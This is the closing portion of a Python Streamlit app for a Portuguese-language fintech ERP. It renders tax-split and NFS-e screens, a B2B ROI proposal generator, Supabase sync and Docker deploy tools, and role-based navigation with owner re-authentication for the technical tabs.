            if st.button("Rotacionar Todas as Chaves X-Meridian-Key Agora", use_container_width=True):
                rotacionadas = IncidentResponsePlaybook.rotate_all_merchant_api_keys(auth)
                st.success(f"Contencao executada: {rotacionadas} chaves de API foram regeneradas.")

    with soc_t5:
        st.markdown("#### Camada 8: Simulador de Conscientizacao contra Phishing & Engenharia Social")
        acertos = 0
        respostas_usuario = {}
        for cenario in SecurityAwarenessTrainer.SCENARIOS:
            st.markdown(f"**{cenario['titulo']}**")
            st.info(cenario["mensagem"])
            escolha = st.radio("Qual e a conduta segura?", cenario["opcoes"], key=f"quiz_sec_{cenario['id']}")
            idx_escolhido = cenario["opcoes"].index(escolha)
            respostas_usuario[cenario["id"]] = (idx_escolhido == cenario["correta"], cenario["explicacao"])
            if idx_escolhido == cenario["correta"]:
                acertos += 1

        if st.button("Validar Treinamento & Emitir Certificado de Seguranca", use_container_width=True):
            nota = round(acertos / len(SecurityAwarenessTrainer.SCENARIOS) * 100)
            render_security_radar(
                acertos == len(SecurityAwarenessTrainer.SCENARIOS),
                f"PONTUACAO: {nota}% ({acertos}/{len(SecurityAwarenessTrainer.SCENARIOS)})",
                "Treinamento concluido nas diretrizes Anti-Phishing, Vishing e Protecao LGPD."
            )


def render_secao_split_tributario(user: dict):
    render_hero_banner(
        title="Motor de Split Tributario & Emissor de NFS-e (Anti-Bitributacao)",
        subtitle="Segregacao automatica da base de calculo entre empresa e comissionados com emissao de RPS/XML assinado via SHA-256.",
        badge_text="TAX SPLIT ENGINE • ABRASF XML • SHA-256"
    )

    col_sim, col_emit = st.columns([1.15, 1.35], gap="medium")

    with col_sim:
        s1, s2 = st.columns(2)
        with s1:
            fat_sim = st.number_input("Faturamento Mensal Bruto (R$)", min_value=1000.0, value=85000.0, step=5000.0)
            quota_est = st.slider("Cota-Parte da Empresa (%)", min_value=10.0, max_value=90.0, value=40.0, step=5.0)
        with s2:
            val_procedimento = st.number_input("Ticket da Venda / Contrato (R$)", min_value=10.0, value=1200.0, step=100.0)
            aliq_imp = st.slider("Aliquota Simples Nacional / ISS (%)", min_value=2.0, max_value=22.0, value=11.5, step=0.5)

        sim_res = tax_engine.calculate_tax_savings_simulation(
            valor_bruto=val_procedimento,
            faturamento_mensal=fat_sim,
            quota_estabelecimento_pct=quota_est,
            aliquota_imposto_pct=aliq_imp
        )

        k_t1, k_t2 = st.columns(2)
        with k_t1:
            render_kpi_card("Imposto Sem Split / Mes", f"R$ {float(sim_res['imposto_cheio_mes']):,.2f}", f"Tributando 100% de R$ {fat_sim:,.2f}", badge="BITRIBUTADO", badge_type="fraud")
        with k_t2:
            render_kpi_card("Imposto Com Split / Mes", f"R$ {float(sim_res['imposto_split_mes']):,.2f}", f"Base reduzida ({quota_est:.0f}% cota-parte)", badge="OTIMIZADO", badge_type="paid")

        render_kpi_card("Economia Tributaria Anual Estimada (12 Meses)", f"R$ {float(sim_res['economia_anual']):,.2f}", f"Economia mensal direta no caixa: R$ {float(sim_res['economia_mensal']):,.2f}/mes", badge="LUCRO RETIDO", badge_type="blue")

    with col_emit:
        tenant_txs = auth.get_tenant_transactions(user)
        paid_txs = [t for t in tenant_txs if t.get("status") == "PAID"]

        if paid_txs:
            tx_map = {
                f"{t['id'][:10]}... | R$ {float(t['valor_bruto']):,.2f} | {t['comprador']}": t
                for t in reversed(paid_txs)
            }
            tx_label = st.selectbox("Selecione uma Venda Liquidada (PAID):", list(tx_map.keys()))
            c_cod, c_aliq = st.columns([1.6, 1])
            with c_cod:
                cod_servico = st.selectbox(
                    "Codigo de Servico LC 116/03:",
                    [
                        "01.07 - Licenciamento de Software e SaaS",
                        "17.19 - Contabilidade, Auditoria e BPO Financeiro",
                        "10.05 - Intermediação, Representação Comercial e Franquias",
                        "17.01 - Assessoria e Consultoria Empresarial"
                    ]
                )
            with c_aliq:
                aliq_nfse = st.number_input("Aliquota ISS/Simples (%)", min_value=2.0, max_value=20.0, value=6.0, step=0.5)

            if st.button("Emitir Notas Fiscais Segregadas (RPS / XML) e Assinar SHA-256", use_container_width=True):
                notas = tax_engine.issue_nfse_for_transaction(
                    tx=tx_map[tx_label],
                    aliquota_pct=aliq_nfse,
                    codigo_lc116=cod_servico
                )
                hub.save_agent_audit_log("NFSE_SPLIT_ISSUED", {"tx_id": tx_map[tx_label]["id"], "count": len(notas)})
                st.success(f"{len(notas)} RPS/NFS-e emitidos com base de calculo segregada.")

                xml_preview = tax_engine.generate_nfse_xml(notas[0])
                st.download_button(
                    label=f"Baixar XML Oficial ABRASF ({notas[0].nfse_id}.xml)",
                    data=xml_preview.encode("utf-8"),
                    file_name=f"{notas[0].nfse_id}.xml",
                    mime="application/xml",
                    use_container_width=True
                )
        else:
            st.info("Realize uma venda na secao FINTECH ERP & SPLIT para emitir o RPS segregado.")


def render_secao_propostas_b2b(wl: WhiteLabelConfig):
    render_hero_banner(
        title="Gerador de Proposta Comercial & Calculadora de ROI B2B",
        subtitle="Simule o ganho financeiro do cliente e gere uma Proposta Comercial Executiva pronta em HTML/PDF.",
        badge_text="B2B SALES ENABLEMENT • WHITE-LABEL LICENSING ENGINE"
    )

    col_form, col_res = st.columns([1.2, 1.3], gap="medium")

    with col_form:
        c1, c2 = st.columns(2)
        with c1:
            cli_empresa = st.text_input("Nome da Empresa Cliente", value="Grupo Empresarial Alpha")
            fat_cli = st.number_input("Faturamento Mensal do Cliente (R$)", min_value=5000.0, value=120000.0, step=10000.0)
            aliq_cli = st.number_input("Aliquota Tributaria Atual (%)", min_value=2.0, max_value=25.0, value=11.0, step=0.5)
            setup_cobrado = st.number_input("Taxa de Implantacao / Setup White-Label (R$)", min_value=0.0, value=3500.0, step=500.0)
        with c2:
            segmento_cli = st.selectbox("Segmento de Mercado", ["Comercio & Servicos B2B", "Escritorio de BPO Financeiro", "Rede de Franquias", "E-commerce & Varejo Digital"])
            repasse_pct = st.slider("Percentual Repassado a Comissionados (%)", min_value=10.0, max_value=85.0, value=55.0, step=5.0)
            horas_bpo = st.number_input("Horas/Mes Gastas em Planilhas Manuais", min_value=2, max_value=200, value=28, step=4)
            mensalidade_cobrada = st.number_input("Mensalidade Recorrente SaaS (R$)", min_value=97.0, value=597.0, step=50.0)

        custo_hora = st.number_input("Custo Medio da Hora Financeira/Contabil (R$)", min_value=20.0, value=65.0, step=5.0)

    roi_info = B2BProposalROIEngine.calculate_b2b_roi(
        faturamento_mensal=fat_cli,
        quota_parceiros_pct=repasse_pct,
        aliquota_atual_pct=aliq_cli,
        horas_conciliacao_mes=horas_bpo,
        custo_hora_financeiro=custo_hora,
        valor_setup_licenca=setup_cobrado,
        mensalidade_saas=mensalidade_cobrada
    )

    with col_res:
        r1, r2 = st.columns(2)
        with r1:
            render_kpi_card("Economia Fiscal / Mes", f"R$ {float(roi_info['economia_fiscal_mes']):,.2f}", "Retencao legal via Split Tributario", badge="ANTI-BITRIBUTACAO", badge_type="paid")
            render_kpi_card("Lucro Liquido do Cliente (1o Ano)", f"R$ {float(roi_info['economia_liquida_ano1']):,.2f}", "Ja descontando Setup e 12 mensalidades", badge=f"ROI {roi_info['roi_anual_pct']}%", badge_type="paid")
        with r2:
            render_kpi_card("Economia Operacional BPO", f"R$ {float(roi_info['economia_bpo_mes']):,.2f}", f"{horas_bpo}h/mes economizadas em conciliacao", badge="AUTOMACAO", badge_type="blue")
            render_kpi_card("Tempo de Payback do Setup", f"{roi_info['payback_dias']} Dias", f"Setup de R$ {setup_cobrado:,.2f} pago no 1o mes", badge="ALTA CONVERSAO", badge_type="blue")

        proposta_html = B2BProposalROIEngine.generate_commercial_proposal_html(
            brand_name=wl.brand_name,
            cliente_empresa=cli_empresa,
            segmento=segmento_cli,
            roi_data=roi_info
        )

        nome_arq_prop = f"proposta_comercial_{cli_empresa.lower().replace(' ', '_')[:22]}.html"
        st.download_button(
            label=f"Baixar Proposta Comercial Executiva ({nome_arq_prop}) — Pronta para PDF",
            data=proposta_html.encode("utf-8"),
            file_name=nome_arq_prop,
            mime="text/html",
            use_container_width=True
        )


def render_secao_supabase_sync():
    render_hero_banner(
        title="Conector Hibrido Cloud (JSON Local SHA-256 + Supabase PostgreSQL)",
        subtitle="Opere offline com velocidade local e sincronize transacoes, carteiras e politicas RLS Multi-Tenant com o Supabase Cloud.",
        badge_text="OWNER ONLY • HYBRID CLOUD DATABASE • POSTGRESQL RLS"
    )

    cfg = supa_sync.load_config()
    col_cfg, col_sql = st.columns([1.15, 1.35], gap="medium")

    with col_cfg:
        url_in = st.text_input("SUPABASE_URL (Project URL)", value=cfg.get("supabase_url", ""), placeholder="https://xyzcompany.supabase.co")
        key_in = st.text_input("SUPABASE_KEY (Anon / Service Role Key)", value=cfg.get("supabase_anon_key", ""), type="password")
        auto_s = st.checkbox("Manter Espelhamento Automatico em cada Transacao", value=cfg.get("auto_sync_enabled", True))

        b_s1, b_s2 = st.columns(2)
        with b_s1:
            if st.button("Salvar Credenciais Cloud", use_container_width=True):
                supa_sync.save_config(url_in, key_in, auto_s)
                st.success("Configuracao Supabase salva e assinada via SHA-256.")
                st.rerun()
        with b_s2:
            if st.button("Sincronizar Ledger & Gerar Snapshot", use_container_width=True):
                res_sync = supa_sync.sync_ledger_to_cloud()
                hub.save_agent_audit_log("SUPABASE_HYBRID_SYNC", res_sync)
                st.success(f"Snapshot assinado. Hash Mestre: `{res_sync['master_sha256'][:18]}...`")
                st.rerun()

    with col_sql:
        st.code(supa_sync.get_postgres_ddl_sql(), language="sql")


def render_secao_deploy_docker():
    render_hero_banner(
        title="Kit de Deploy em Producao (Docker + FastAPI + Streamlit)",
        subtitle="Gere com 1 clique os arquivos de containerizacao na raiz do projeto e publique o SaaS com HTTPS.",
        badge_text="OWNER ONLY • DEVOPS & CLOUD DEPLOY • DOCKER COMPOSE"
    )

    col_gen, col_files = st.columns([1.1, 1.4], gap="medium")

    with col_gen:
        if st.button("Gerar & Assinar Kit Docker na Raiz do Projeto Agora", use_container_width=True):
            criados = ProductionDeployGenerator.write_deploy_kit_to_disk(monitor=monitor, target_dir=".")
            hub.save_agent_audit_log("DEPLOY_KIT_GENERATED", {"files": criados})
            render_security_radar(True, f"ARQUIVOS GERADOS E PROTEGIDOS: {', '.join(criados)}", "Registrados no Monitor SHA-256.")

        st.code(
            "docker compose up --build -d\n"
            "gcloud run deploy meridian-fintech-erp --source . --port 8501 --allow-unauthenticated",
            language="bash"
        )

    with col_files:
        d_tab1, d_tab2, d_tab3 = st.tabs(["Dockerfile", "docker-compose.yml", "requirements.txt"])
        with d_tab1:
            st.code(ProductionDeployGenerator.get_dockerfile_content(), language="dockerfile")
        with d_tab2:
            st.code(ProductionDeployGenerator.get_docker_compose_content(), language="yaml")
        with d_tab3:
            st.code(ProductionDeployGenerator.get_requirements_content(), language="text")


def render_monitoramento_nativo(monitor):
    render_hero_banner(
        title="Monitoramento de Integridade de Arquivos (FIM)",
        subtitle="Vigilancia criptografica em tempo real com hashes SHA-256 / MD5 e bloqueio contra adulteracao.",
        badge_text="OWNER ONLY • FILE INTEGRITY MONITOR • SHA-256"
    )

    summary = monitor.get_status_summary() if hasattr(monitor, "get_status_summary") else {}
    mod_count = summary.get("modified_count", 0)
    del_count = summary.get("deleted_count", 0)
    is_clean = (mod_count == 0 and del_count == 0)

    render_security_radar(
        is_healthy=is_clean,
        title="SISTEMA DE ARQUIVOS INTEGRO E PROTEGIDO" if is_clean else f"ALERTA FIM: {mod_count} MODIFICADO(S)",
        detail="Monitorando continuamente o livro-razao JSON, cadastros RBAC, RPS/NFS-e e logs SIEM."
    )

    if st.button("Executar Varredura Criptografica Agora", use_container_width=True):
        if hasattr(monitor, "run_once"):
            monitor.run_once()
        else:
            monitor.scan_directory()
        st.rerun()

    resultados = monitor.scan_directory()
    if resultados:
        df = pd.DataFrame([
            {
                "Arquivo": f.filepath,
                "Status": f.status,
                "Bytes": getattr(f, "file_size", 0),
                "Hash SHA-256": (f.current_hash[:32] + "...") if getattr(f, "current_hash", None) else "N/A"
            }
            for f in resultados
        ])
        st.dataframe(df, use_container_width=True, hide_index=True)


# =============================================================================
# 5. FLUXO PRINCIPAL (BARRA LATERAL ESTÁTICA 300PX E SEPARAÇÃO PROPRIETÁRIO / FUNCIONÁRIOS)
# =============================================================================

if st.session_state.user_session is None:
    render_login_portal(wl_config)
else:
    hide_cookie_widget_when_logged_in()
    user = st.session_state.user_session
    role = user.get("role", "MERCHANT")
    is_owner = (role in ("ADMIN", "MERCHANT"))
    logo_svg = get_meridian_logo_svg(wl_config.primary_color, wl_config.accent_color, size=26)

    with st.sidebar:
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:10px; padding: 8px 4px 16px 4px;">
                {logo_svg}
                <span style="font-size:1.32rem; font-weight:700; color:#ffffff; letter-spacing:1px;">
                    {wl_config.brand_name}
                </span>
            </div>
            """,
            unsafe_allow_html=True
        )

        filtro_busca = st.text_input("Search", placeholder="Search for...", label_visibility="collapsed")

        st.markdown(
            f"<div style='font-size:0.7rem; color:var(--dd-text-secondary); font-weight:700; letter-spacing:1.6px; text-transform:uppercase; margin: 10px 0 6px 4px;'>CARGO: {user.get('cargo', role)}</div>",
            unsafe_allow_html=True
        )

        # Funcionários (Atendente, Supervisor, Comissionado) herdam o tema, mas NÃO veem White-Label nem abas técnicas de TI
        if role == "STAFF":
            todas_opcoes = [
                "FINTECH ERP & SPLIT",
                "AGENTES DE CONVERSAO"
            ]
        elif role in ("PARTNER", "AUDITOR"):
            todas_opcoes = [
                "COMMAND CENTER",
                "FINTECH ERP & SPLIT",
                "SPLIT TRIBUTARIO & NFSE"
            ]
        elif role == "MERCHANT":
            todas_opcoes = [
                "COMMAND CENTER",
                "EQUIPE & FUNCIONARIOS",
                "FINTECH ERP & SPLIT",
                "SPLIT TRIBUTARIO & NFSE",
                "AGENTES DE CONVERSAO",
                "WHITE-LABEL & TEMAS",
                "CIBERSEGURANCA & SOC",
                "MONITOR DE INTEGRIDADE"
            ]
        else:
            todas_opcoes = [
                "COMMAND CENTER",
                "EQUIPE & FUNCIONARIOS",
                "FINTECH ERP & SPLIT",
                "SPLIT TRIBUTARIO & NFSE",
                "PROPOSTAS & ROI B2B",
                "AGENTES DE CONVERSAO",
                "WHITE-LABEL & TEMAS",
                "CIBERSEGURANCA & SOC",
                "SUPABASE CLOUD SYNC",
                "DEPLOY & DOCKER KIT",
                "MONITOR DE INTEGRIDADE"
            ]

        opcoes_filtradas = [
            op for op in todas_opcoes
            if not filtro_busca.strip() or filtro_busca.strip().upper() in op
        ] or todas_opcoes

        if st.session_state.active_nav_page not in todas_opcoes:
            st.session_state.active_nav_page = todas_opcoes[0]

        for item_nav in opcoes_filtradas:
            is_current = (st.session_state.active_nav_page == item_nav)
            if st.button(
                item_nav,
                key=f"nav_iso_{item_nav}",
                type="primary" if is_current else "secondary",
                use_container_width=True
            ):
                st.session_state.active_nav_page = item_nav
                st.rerun()

        st.divider()

        render_user_badge_sidebar(user, lgpd_active=wl_config.lgpd_masking_default)

        if st.button("ENCERRAR SESSAO", key="btn_logout_iso", use_container_width=True):
            st.session_state.user_session = None
            st.session_state.it_identity_verified = False
            st.rerun()

    pagina_selecionada = st.session_state.active_nav_page
    render_dashdark_topbar(user, wl_config, subtitle=f"Cargo: {user.get('cargo', role)} • Modulo: {pagina_selecionada}")

    # Abas técnicas de TI restritas exclusivamente ao Proprietário + Confirmação de Identidade
    abas_tecnicas_ti = {"CIBERSEGURANCA & SOC", "SUPABASE CLOUD SYNC", "DEPLOY & DOCKER KIT", "MONITOR DE INTEGRIDADE"}
    if pagina_selecionada in abas_tecnicas_ti:
        if not is_owner:
            st.error("Acesso restrito exclusivamente ao Proprietario / Administrador.")
            st.stop()
        if not st.session_state.get("it_identity_verified", False):
            st.markdown(
                """
                <div class="sec-formal-alert">
                    <div class="sec-formal-alert-title">CONFIRMACAO DE IDENTIDADE EXIGIDA — AREA TECNICA DE TI & SEGURANCA</div>
                    <div class="sec-formal-alert-body">
                        Este modulo contem controles criticos de infraestrutura, banco de dados e ciberseguranca restritos ao Proprietario.
                        Confirme sua senha de proprietario abaixo para validar sua identidade e liberar o acesso na sessao atual.
                    </div>
                </div>
                """,
                unsafe_allow_html=True
            )
            senha_conf = st.text_input("Confirme sua Senha de Proprietario / Admin", type="password", key="it_reauth_pw")
            if st.button("CONFIRMAR IDENTIDADE E LIBERAR ACESSO TECNICO"):
                if auth._verify_password(senha_conf, user["password_hash"], user["salt"]):
                    st.session_state.it_identity_verified = True
                    st.rerun()
                else:
                    st.error("Senha incorreta. Confirmacao de identidade negada.")
            st.stop()

    if pagina_selecionada == "COMMAND CENTER":
        raw_tenant_txs = auth.get_tenant_transactions(user)
        tenant_txs = [
            LGPDMasker.sanitize_transaction(t, mask_active=wl_config.lgpd_masking_default)
            for t in raw_tenant_txs
        ]
        tenant_wallets = auth.get_tenant_wallets(user)
        diag = hub.run_full_diagnostics()
        siem_rep = diag["siem_webhook_payload"]

        saldo_liquido_tenant = sum(float(v) for v in tenant_wallets.values())
        pendentes_tenant = [t for t in raw_tenant_txs if t.get("status") == "PENDING"]

        if role == "PARTNER":
            comissoes_pagas = sum(
                float(t.get("split", {}).get("vendedor", 0))
                for t in raw_tenant_txs if t.get("status") == "PAID"
            )
            k1, k2, k3, k4 = st.columns(4)
            with k1:
                render_kpi_card("Minhas Comissoes Acumuladas", f"R$ {comissoes_pagas:,.2f}", f"Cota-parte liquida ({user.get('vendedor_id')})", badge="COMISSAO LIQUIDA", badge_type="paid")
            with k2:
                render_kpi_card("Meu Saldo p/ Saque Pix", f"R$ {saldo_liquido_tenant:,.2f}", f"Pix: {user.get('chave_pix')}", badge="DISPONIVEL", badge_type="blue")
            with k3:
                render_kpi_card("Vendas / Contratos Participados", f"{len(raw_tenant_txs)} Registros", f"Cargo: {user.get('cargo')}", badge=f"{user.get('comissao_padrao_pct', 35)}% SPLIT", badge_type="paid")
            with k4:
                render_kpi_card("Auditoria SHA-256 & LGPD", siem_rep["status"], "Seus repasses estao assinados no Ledger", badge="VERIFIED", badge_type="paid")
        else:
            receita_bruta_tenant = sum(float(t.get("valor_bruto", 0)) for t in raw_tenant_txs if t.get("status") == "PAID")
            k1, k2, k3, k4 = st.columns(4)
            with k1:
                render_kpi_card("Gross Revenue (Paid)", f"R$ {receita_bruta_tenant:,.2f}", f"Escopo ativo: {user.get('vendedor_id')}", badge="+28.4%", badge_type="paid")
            with k2:
                render_kpi_card("Net Wallet Liquidity", f"R$ {saldo_liquido_tenant:,.2f}", "Disponivel para Saque Pix imediato", badge="+15.3%", badge_type="blue")
            with k3:
                render_kpi_card("Recoverable Checkouts", f"{len(pendentes_tenant)} Orders", "Monitorados pelo Agente de Recuperacao", badge="PENDING" if pendentes_tenant else "100% CONV", badge_type="pending" if pendentes_tenant else "paid")
            with k4:
                render_kpi_card("AppSec & Ledger FIM", siem_rep["status"], f"Severidade SIEM: {siem_rep['severity']}", badge="SHA-256", badge_type="paid" if siem_rep["status"] == "HEALTHY" else "fraud")

        render_dashdark_tier2_charts(raw_tenant_txs)
        render_dashdark_tier3_section(raw_tenant_txs, tenant_wallets, siem_rep, wl_config.brand_name)
        render_dashdark_orders_table(tenant_txs)

    elif pagina_selecionada == "CIBERSEGURANCA & SOC" and is_owner:
        render_secao_ciberseguranca_soc(user)

    elif pagina_selecionada == "EQUIPE & FUNCIONARIOS" and is_owner:
        render_secao_equipe_corporativa(user)

    elif pagina_selecionada == "FINTECH ERP & SPLIT":
        render_pagamentos()

    elif pagina_selecionada == "SPLIT TRIBUTARIO & NFSE":
        render_secao_split_tributario(user)

    elif pagina_selecionada == "PROPOSTAS & ROI B2B" and is_owner:
        render_secao_propostas_b2b(wl_config)

    elif pagina_selecionada == "SUPABASE CLOUD SYNC" and is_owner:
        render_secao_supabase_sync()

    elif pagina_selecionada == "DEPLOY & DOCKER KIT" and is_owner:
        render_secao_deploy_docker()

    elif pagina_selecionada == "AGENTES DE CONVERSAO":
        render_hero_banner(
            title="Agentes Autonomos de E-commerce & Conversao",
            subtitle="Rastreamento de checkouts pendentes e propostas dinamicas via PIX.",
            badge_text=f"AI SALES RECOVERY • ESCOPO: {user.get('vendedor_id')}"
        )

        todas_rec = hub.recovery.find_recoverable_sales(engine)
        recuperaveis = todas_rec if role == "ADMIN" else [r for r in todas_rec if r.get("vendedor_id") == user.get("vendedor_id")]

        if recuperaveis:
            for venda in recuperaveis:
                with st.expander(f"Cliente: {venda['comprador']} — R$ {float(venda['valor_original']):,.2f}"):
                    st.code(venda["mensagem_sugerida"], language="text")
        else:
            render_security_radar(True, "FUNIL DE VENDAS 100% CONVERTIDO", "Nao ha pagamentos pendentes para esta conta.")

    elif pagina_selecionada == "WHITE-LABEL & TEMAS" and is_owner:
        render_whitelabel_studio(wl_config)

    elif pagina_selecionada == "MONITOR DE INTEGRIDADE" and is_owner:
        render_monitoramento_nativo(monitor)

    render_dashdark_footer(wl_config)
